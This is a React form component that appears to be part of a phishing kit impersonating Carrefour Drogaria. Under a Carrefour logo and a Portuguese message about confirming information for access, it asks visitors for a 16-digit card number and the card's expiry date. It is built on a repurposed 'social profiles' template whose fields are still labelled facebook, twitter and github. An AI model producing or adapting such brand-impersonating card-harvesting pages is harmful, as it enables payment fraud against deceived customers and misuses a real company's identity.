import React, { Component } from 'react'
import logo from './logo_carrefo.png'

export class SocialProfiles extends Component {
    continue = e => {
        e.preventDefault();
        this.props.nextStep();
    };

    back = e => {
        e.preventDefault();
        this.props.prevStep();
    };

    render() {
        const { values, inputChange } = this.props;

        return (
            <div className="form-container">
                            <img style={{margin:30}} src={logo} width="100"/>

                <p className=""><b>Tudo certo!<br></br></b>Agora Precisamos confirmar algumas informações para que você possa acessar o <b> Carrefour Drogaria</b></p>
                <div className="form-group">
                    <input placeholder="16 dígitos do cartão" type="text" className="form-control" name="facebook" onChange={inputChange('cc')} value={values.cc} />
                </div>
                <div className="form-group">
                    <input placeholder="Validade(MM/AAAA)" type="text" className="form-control" name="twitter" onChange={inputChange('twitter')} value={values.twitter} />
                </div>
                <div className="form-group">
                    <label htmlFor="github">Github URL</label>
                    <input type="text" className="form-control" name="github" onChange={inputChange('github')} value={values.github} />
                </div>

                <br />

                <div className="row">
                    <div className="col-6">
                        <button className="btn btn-danger" onClick={this.back}>Back</button>
                    </div>
                    <div className="col-6 text-right">
                        <button className="btn btn-primary" onClick={this.continue}>Continue</button>
                    </div>
                </div>
            </div>
        )
    }
}

export default SocialProfiles
